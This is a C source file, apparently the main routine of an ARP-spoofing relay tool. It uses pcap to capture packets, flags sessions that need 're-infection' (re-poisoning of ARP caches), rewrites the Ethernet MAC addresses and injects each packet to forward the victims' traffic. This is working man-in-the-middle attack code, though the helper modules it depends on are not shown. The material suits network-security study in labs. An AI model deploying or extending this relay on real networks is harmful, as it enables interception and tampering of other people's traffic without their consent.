#include "ethernethelper.h"
#include "arphelper.h"
#include "iphelper.h"
#include "tcphelper.h"
#include "udphelper.h"
#include "packetmaker.h" 
#include "packetAnalyzer.h"
#include "arpSpoofer.h" 
 
int main(int argc, char* argv[]) {
	if(basicSetting(argc, argv) == -1){
		printf("basic setting error\n"); 	
		return -1; 
	}

	if(sessionSetting(argc, argv) ==-1){
		printf("session setting error\n"); 
		return -1; 
	}
	usleep(100); 
	while(true){
			struct pcap_pkthdr* header;
	 		const u_char* packet;
	  	pthread_mutex_lock(&mutex); 
			printf("main, get lock\n"); 
			int res = pcap_next_ex(handle, &header, &packet);
		 	pthread_mutex_unlock(&mutex); 
			printf("main, free the lock\n"); 
			if(res == 0) continue;
		  if(res == -1 || res == -2){
				printf("error in capturing..\n");
			  break;
			}
			else{
				printf("- "); 
				int signum = 0; 
				int result = RelayAnalysis(header, packet, &signum);
				if(result == -1) {
					printf("it's not my work\n"); 
					continue; 
				}
				if(result == -2){
					pthread_mutex_lock(&mutex); 
					threadSignal[signum] = 1; 
					pthread_mutex_unlock(&mutex); 
					printf("signum is %d\n", signum); 
					printf("need new Infection!!\n");
					usleep(100); 
					continue; 
				} 
				memcpy(packet, ipsets[result].targetMac, 6);	//destination_mac
				memcpy(packet + 6, mac, 6); 
				printf("============================\n"); 
				printHexValue("= relay new Target : ", ipsets[result].targetMac, 6, ':');
				printf("\n"); 
				pthread_mutex_lock(&mutex); 
				if(pcap_inject(handle, packet, header->caplen) == header->caplen) 
					printf("relay success\n"); 
				pthread_mutex_unlock(&mutex); 
			}
	} 

	pcap_close(handle); 
	return 0; 
}

